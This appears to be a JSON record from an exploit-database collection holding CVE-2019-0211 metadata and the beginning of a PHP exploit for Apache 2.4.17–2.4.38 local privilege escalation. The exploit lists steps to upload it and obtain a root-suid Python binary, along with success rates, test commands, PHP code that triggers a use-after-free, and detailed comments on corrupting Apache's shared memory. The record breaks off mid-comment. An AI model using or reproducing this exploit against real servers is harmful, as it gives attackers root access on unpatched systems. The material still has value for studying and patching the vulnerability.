{
    "text": "ecve : CVE-2019-0211 ， title : Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation - Linux local Exploit ， verified : Not Verified ， exploit_detail : <?php ，  # CARPE ( DIEM )  : CVE-2019-0211 Apache Root Privilege Escalation ，  # Charles Fol ，  #  @ cfreal_ ，  # 2019-04-08 ，  # INFOS ，  # USAGE ，  # 1. Upload exploit to Apache HTTP server ，  # 2. Send request to page ，  # 3. Await 6 : 25AM for logrotate to restart Apache ，  # 4. python3.5 is now suid 0 ，  # You can change the command that is ran as root using the cmd HTTP ，  # parameter ( GET/POST ) . ，  # Example : curl ，  # SUCCESS RATE ，  # Number of successful and failed exploitations relative to of the number ，  # of MPM workers ( i.e. Apache subprocesses ) . YMMV. ，  # W --% S F ，  # 5 87% 177 26 ( default )  ，  # 8 89% 60 8 ，  # 10 95% 70 4 ，  # More workers , higher success rate. ，  # By default ( 5 workers )  , 87% success rate. With huge HTTPds , close to 100%. ，  # Generally , failure is due to all_buckets being relocated too far from its ，  # original address. ，  # TESTED ON ，  # - Apache/2.4.25 ，  # - PHP 7.2.12 ，  # - Debian GNU/Linux 9.6 ，  # TESTING ，  #  $ curl ，  #  $ sudo /usr/sbin/logrotate /etc/logrotate.conf -force ，  #  $ ls -alh /usr/bin/python3.5 ，  # -rwsr-sr-x 2 root root 4.6M Sep 27 2018 /usr/bin/python3.5 ，  # There are no hardcoded addresses. ，  # - Addresses read through /proc/self/mem ，  # - Offsets read through ELF parsing ，  # As usual , there are tons of comments. ， o ( 'CARPE ( DIEM )  ~ CVE-2019-0211' )  ;  ， o ( '' )  ;  ， error_reporting ( E_ALL )  ;  ，  # Starts the exploit by triggering the UAF. ， global $ y ;  ，  $ y = [ new Z (  )  ]  ;  ， json_encode (  [ 0 => & $ y ]  )  ;  ，  # In order to read/write what comes after in memory , we need to UAF a string so ，  # that we can control its size and make in-place edition. ，  # An easy way to do that is to replace the string by a timelib_rel_time ，  # structure of which the first bytes can be reached by the ( y , m , d , h , i , s )  ，  # properties of the DateInterval object. ，  # Steps :  ，  # - Create a base object ( Z )  ，  # - Add string property ( abc ) so that sizeof ( abc ) = sizeof ( timelib_rel_time )  ，  # - Create DateInterval object (  $ place ) meant to be unset and filled by another ，  # - Trigger the UAF by unsetting $ y [ 0 ]  , which is still reachable using $ this ，  # - Unset $ place : at this point , if we create a new DateInterval object , it will ，  # replace $ place in memory ，  # - Create a string (  $ holder ) that fills $ place's timelib_rel_time structure ，  # - Allocate a new DateInterval object : its timelib_rel_time structure will ，  # end up in place of abc ，  # - Now we can control $ this->abc's zend_string structure entirely using ，  # y , m , d etc. ，  # - Increase abc's size so that we can read/write memory that comes after it ,  ，  # especially the shared memory block ，  # - Find out all_buckets' position by finding a memory region that matches the ，  # mutex->meth structure ，  # - Compute the bucket index required to reach the SHM and get an arbitrary ，  # function call ，  # - Scan ap_scoreboard_image->parent [  ] to find workers' PID and replace the ，  # bucket",
    "time": "2019-04-08"
}